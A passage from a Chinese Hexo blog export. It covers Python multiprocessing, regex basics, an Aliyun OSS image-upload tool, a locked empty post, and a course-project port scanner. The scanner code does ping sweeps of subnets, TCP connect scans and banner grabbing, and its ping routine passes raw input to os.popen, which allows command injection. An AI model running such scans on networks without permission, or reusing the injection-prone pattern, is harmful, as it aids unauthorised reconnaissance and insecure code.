<li><p>上述的queue和pipe都是进程间的通信，实在一个进行池中，如果不在一个进程池中，用multiprocessing.Manager().Queue() 通信；同时：子进程与父进程的通信试用subprocess比较好</p>
<ul>
<li><p>不同进程池之间的通信实例如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pool,Queue,Manager</span><br><span class="line"><span class="keyword">import</span> os,time,random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(q,list,i)</span>:</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+str(i)+<span class="string">" and pid is %s START"</span>%os.getpid())</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list:</span><br><span class="line">        q.put(item)</span><br><span class="line">        print(<span class="string">"[+] Pid %s Put : %s"</span>%(os.getpid(),item))</span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+i+<span class="string">" and pid is %s CLOSE"</span>%os.getpid())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">     print(os.getpid())</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">     print(<span class="string">'[====] Process to Read , pid = %s'</span>%os.getpid())</span><br><span class="line">     <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">         data = q.get(<span class="keyword">True</span>)</span><br><span class="line">         print(<span class="string">"[=] data from Queue : %s"</span>%str(data))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     manager = Manager()</span><br><span class="line">     q = manager.Queue()</span><br><span class="line">     p = Pool(<span class="number">5</span>)</span><br><span class="line">     listx = []</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">110</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">200</span>,<span class="number">210</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">300</span>,<span class="number">310</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">400</span>,<span class="number">410</span>)])</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">         <span class="keyword">if</span> i==<span class="number">4</span>:</span><br><span class="line">             <span class="keyword">pass</span></span><br><span class="line">             p.apply_async(read,args=(q,))</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             list = listx[i]</span><br><span class="line">             <span class="comment">#print(list)</span></span><br><span class="line">             p.apply_async(write,args=(q,list,i))</span><br><span class="line">     p.close()</span><br><span class="line">     p.join()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>
<p> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529162485.23.png" alt></p>
</li>
</ul>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>通过一些实例学习python3的多进程，包含了主要的两个类及其适用方法；同一进程池中进程间通信，不同进程池中进程间的通信以及父类与子类的进程间通信</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title>python3正则表达式学习</title>
    <url>/2018/06/15/python3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<ol>
<li><p>python3正则表达式学习</p>
<blockquote>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。</p>
<p>compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。</p>
</blockquote>
</li>
<li><p>正则表达式基础</p>
<ul>
<li><p>子模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\w: 匹配任意字母、数字、或者_</span><br><span class="line">\d: 匹配数字（十进制）</span><br><span class="line">\s: 匹配空白符号（空格、tab等）</span><br><span class="line">. : 匹配任意字符（换行符除外）</span><br></pre></td></tr></table></figure>
</li>
<li><p>重复子模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d* : 表示任意数字，包括0个，*匹配0次或者多次</span><br><span class="line">\w+ : 表示匹配至少一个字母、数字、或者_</span><br><span class="line">\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_</span><br></pre></td></tr></table></figure>
</li>
<li><p>“或”运算  - |</p>
<p><code>(p|P)ython :可以匹配Python也可以匹配python</code> </p>
</li>
<li><p>选择符：？</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz  https://lsowl.xyz www.lsowl.xyz  lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到</span><br></pre></td></tr></table></figure>
<p>字符集：[]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[a-zA-Z0-9_] : 等价于\w</span><br><span class="line">[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始符和结尾符：^ , $</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^\d : 以数字开始</span><br><span class="line">\w$ : 以字母结尾</span><br><span class="line">^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量</span><br></pre></td></tr></table></figure>
</li>
<li><p>分组: ()</p>
<ul>
<li><p>捕获组</p>
<p><code>(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529035700.3.png" alt></p>
</li>
<li><p>非捕获组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名</span><br><span class="line"></span><br><span class="line">(?:\d+\.)&#123;3&#125;\d+ : 匹配IP</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>正则表达式使用的特殊符号和字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">literal 匹配字符串的值</span><br><span class="line">re1|re2 匹配正则表达式re1或re2</span><br><span class="line">. 匹配任意字符（换行符除外）</span><br><span class="line">^ 匹配字符串的开始</span><br><span class="line">$ 匹配字符串的结尾</span><br><span class="line">* 匹配前面出现的正则表达式零次或多次</span><br><span class="line">+ 匹配前面出现的正则表达式一次或多次</span><br><span class="line">？匹配前面出现的正则表达式零次或一次</span><br><span class="line">&#123;N&#125; 匹配前面出现的正则表达式N次</span><br><span class="line">&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式</span><br><span class="line">[…] 匹配字符组里出现的任意一个字符</span><br><span class="line">[…x-y…] 匹配从字符x到y中的任意一个字符</span><br><span class="line">[^…] 不匹配此字符集中出现的任意一个字符</span><br><span class="line">(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。</span><br><span class="line">(…) 匹配封闭括号中正则表达式（RE），并保存为子组</span><br><span class="line">\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）</span><br><span class="line">\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)</span><br><span class="line">\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）</span><br><span class="line">\b 匹配单词边界(\B是\b的反义)</span><br><span class="line">\nn 匹配已保存的子组（参考(…)）如price:\16</span><br><span class="line">\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）</span><br><span class="line">\A（\Z）匹配字符串的起始（结束）</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些说明</p>
<p>（1）用管道符号(|)匹配多个正则表达式<br>（2）匹配除换行符外任意一个单个的字符（.）<br>（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）<br>（4）创建字符类（[]）<br>（5）指定范围（-）和否定（^）<br>（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配<br>（7）？的两种含义：</p>
<ul>
<li><p>表示匹配出现0或1次；</p>
</li>
<li><p>紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。</p>
</li>
</ul>
<p>（7）特殊字符表示、字符集</p>
<ul>
<li>\d表示十进制数字（\D表示非十进制数字）</li>
<li>\w表示整个字符数字的字符集（\W）</li>
<li>\s表示空白字符（\S）</li>
</ul>
<p>（8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 </p>
<ul>
<li>对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 </li>
<li>使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。</li>
</ul>
</li>
</ul>
</li>
<li><p>python的re模块<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529038902.67.png" alt></p>
<ul>
<li><p>re模块的用法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">"xxxflag&#123;sss&#125;sss"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #用法1：</span></span><br><span class="line">re_flag = re.compile(<span class="string">r'flag&#123;\w+?&#125;'</span>)</span><br><span class="line">flag = re_flag.findall(str)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用法2：</span></span><br><span class="line">flag =re.findall(<span class="string">r'flag&#123;\w+?&#125;'</span>,str)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
</li>
<li><p>贪心匹配和非贪心匹配</p>
<ul>
<li>贪心匹配：正则表达尽可能多的匹配元素</li>
<li>非贪心匹配：正则表达式尽可能少的匹配元素<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040261.44.png" alt></li>
</ul>
</li>
<li><p>match和search的区别</p>
<ul>
<li>match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None</li>
<li>search匹配整个字符串，直到找到一个匹配<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040638.88.png" alt></li>
</ul>
</li>
<li><p>分组匹配（优点在说明第（8）点）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529041162.79.png" alt></p>
</li>
</ul>
</li>
<li><p>python中常用的正则表达式处理函数</p>
<ul>
<li>re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047137.61.png" alt><ul>
<li>函数语法 <code>re.match(partten,string,flags=0)</code></li>
<li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529046903.24.png" alt></li>
<li>使用group(num)或groups()匹配对象函数来获取匹配表达式<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047000.4.png" alt></li>
</ul>
</li>
<li>re.search() 扫描整个字符串并返回第一个成功的匹配<ul>
<li>函数语法 <code>re.search(pattern,string,flags=0)</code></li>
<li>使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</li>
</ul>
</li>
<li>re.sub()用于替换字符串中的匹配项<ul>
<li>函数语法 <code>re.sub(pattern,repl,string,count=0)</code></li>
<li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047446.1.png" alt></li>
<li>使用实例(包含是否使用repl参数的，repl可能是个函数)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047654.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048005.62.png" alt></li>
</ul>
</li>
<li>re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用<ul>
<li>函数语法 <code>re.compile(pattern[, flags])</code> </li>
<li>参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048191.55.png" alt></li>
<li>使用实例（当匹配成功的时候返回一个match对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048612.56.png" alt><img src="assets/1529049199.01.png" alt></li>
</ul>
</li>
<li>re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表<ul>
<li>函数语法 <code>findall(string[, pos[, endpos]])</code></li>
<li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049378.54.png" alt></li>
<li>使用实例（用compile函数生成正则表达式对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049557.51.png" alt></li>
</ul>
</li>
<li>re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回<ul>
<li>函数语法 <code>re.finditer(pattern, string, flags=0)</code></li>
<li>函数参数<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049714.1.png" alt></li>
<li>使用实例(用for循环迭代输出)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049815.39.png" alt></li>
</ul>
</li>
<li>re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 <ul>
<li>函数语法 <code>re.split(pattern, string[, maxsplit=0, flags=0])</code></li>
<li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049924.84.png" alt></li>
<li>使用实例（对于一个找不到匹配的字符串，split不会分割）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529050075.58.png" alt></li>
</ul>
</li>
</ul>
</li>
<li><p>正则表达式对象</p>
<ul>
<li><p>re.RegexObject  (re.compile() 返回的就是一个正则表达式对象)</p>
</li>
<li><p>group()返回被RE匹配的字符串</p>
</li>
<li><p>start() 返回开始匹配的位置</p>
</li>
<li><p>end()  返回匹配结束的位置</p>
</li>
<li><p>span()返回一个元组包含（开始，结束）的位置</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>简易端口扫描器</title>
    <url>/2018/06/14/%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<blockquote>
<p>只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。</p>
</blockquote>
<h2 id="程序运行实例"><a href="#程序运行实例" class="headerlink" title="程序运行实例"></a>程序运行实例</h2><ul>
<li>打印装逼信息：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-16/38144694.jpg" alt></li>
<li>扫描实例：<img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521168691496.png" alt="52116869149"></li>
<li>具体用法程序中有说明</li>
</ul>
<h2 id="程序说明"><a href="#程序说明" class="headerlink" title="程序说明"></a>程序说明</h2><blockquote>
<p>程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。</p>
</blockquote>
<ol>
<li><p>通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">"ping"</span>, <span class="string">"-&#123;op&#125;"</span>.format(op=self.get_os()),</span><br><span class="line">          <span class="string">"1"</span>, self.ip_pre]</span><br><span class="line">            output = os.popen(<span class="string">" "</span>.join(cmd)).readlines()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> list(output):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> str(line).upper().find(<span class="string">"TTL"</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    flag = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] IP: %s is OK "</span> % self.ip_pre</span><br><span class="line">                ip_str.append(self.ip_pre)</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Ping</span><span class="params">(self, Port)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> OpenPort, lock, Timeout</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(Timeout)</span><br><span class="line">        address = (self.IP, Port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.connect(address)</span><br><span class="line">            ready = select.select([sock],[],[],<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            OpenPort.append(str(Port))</span><br><span class="line">            ScanIP_list.append(self.IP)</span><br><span class="line">            <span class="keyword">if</span> ready[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  +sock.recv(<span class="number">4096</span>)</span><br><span class="line">                sock.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  + <span class="string">"Unknow!\n"</span></span><br><span class="line">                sock.close()</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.SingleQueue.empty():</span><br><span class="line">            p = self.SingleQueue.get()</span><br><span class="line">            self.Ping(p)</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_port</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> PortList</span><br><span class="line">        PortList = []</span><br><span class="line">        ListTmp = argv.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ListTmp:</span><br><span class="line">            <span class="keyword">if</span> port.find(<span class="string">".."</span>) &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit():</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                PortList.append(int(port))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RangeLst = port.split(<span class="string">".."</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (RangeLst[<span class="number">0</span>].isdigit() <span class="keyword">and</span> RangeLst[<span class="number">1</span>].isdigit()):</span><br><span class="line">                    <span class="keyword">raise</span> ValueError</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(int(RangeLst[<span class="number">0</span>]), int(RangeLst[<span class="number">1</span>])):</span><br><span class="line">                    PortList.append(i)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_scan</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">global</span> nThread, PortList, strIP, ScanIP_list, OpenPort</span><br><span class="line">        <span class="keyword">del</span> ScanIP_list[:]</span><br><span class="line">        <span class="keyword">del</span> OpenPort[:]</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strIP = socket.gethostbyname(str(argv))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        SingleQueue = GetQueue(PortList)</span><br><span class="line">        <span class="keyword">if</span> PortList != <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, nThread):</span><br><span class="line">                t = ScanThreadSingle(strIP, SingleQueue)</span><br><span class="line">                ThreadList.append(t)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_ping</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> commandargs</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        commandargs = str(argv)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] Input is %s "</span> % commandargs + <span class="string">'\n'</span></span><br><span class="line">        args = <span class="string">""</span>.join(commandargs)</span><br><span class="line">        ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            ip = <span class="string">'%s.%s'</span> % (ip_prefix,i)</span><br><span class="line">            s = PING(ip)</span><br><span class="line">            ThreadList.append(s)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.start()</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure>
</li>
<li><p>这些就是整个程序中核心的几个模块，具体代码请看源码。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS攻击</title>
    <url>/2018/06/13/HTTPS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云OSS智能上传图床</title>
    <url>/2018/06/13/%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<blockquote>
<p>背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。</p>
</blockquote>
<h2 id="程序流程图如下："><a href="#程序流程图如下：" class="headerlink" title="程序流程图如下："></a>程序流程图如下：</h2><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/77366569.jpg" alt></p>
<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"><a href="#图片截图以后，从粘贴板获取图片保存到本地Image文件夹下" class="headerlink" title="图片截图以后，从粘贴板获取图片保存到本地Image文件夹下"></a>图片截图以后，从粘贴板获取图片保存到本地Image文件夹下</h3><ul>
<li><p>使用win32clipboard，win32con，PIL模块</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32clipboard <span class="keyword">as</span> w</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageGrab</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = ImageGrab.grabclipboard()      <span class="comment">#从粘贴板获取内容</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(im,Image.Image):      <span class="comment">#判断是不是图片</span></span><br><span class="line">            name = str(time.time()) + <span class="string">".png"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取到图片以后判断是否为图片然后保存到本地</p>
</li>
<li><p>这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存</p>
</li>
</ul>
<h3 id="将图片上传以后的生成的访问地址添加到粘贴板"><a href="#将图片上传以后的生成的访问地址添加到粘贴板" class="headerlink" title="将图片上传以后的生成的访问地址添加到粘贴板"></a>将图片上传以后的生成的访问地址添加到粘贴板</h3><ul>
<li><p>使用win32clipboard，win32con模块</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setText</span><span class="params">(self,aString)</span>:</span></span><br><span class="line">        w.OpenClipboard()</span><br><span class="line">        w.EmptyClipboard()</span><br><span class="line">        w.SetClipboardData(win32con.CF_TEXT,aString)</span><br><span class="line">        w.CloseClipboard()</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码</p>
</li>
</ul>
<h3 id="上传图片到OSS"><a href="#上传图片到OSS" class="headerlink" title="上传图片到OSS"></a>上传图片到OSS</h3><ul>
<li><p>使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3</p>
</li>
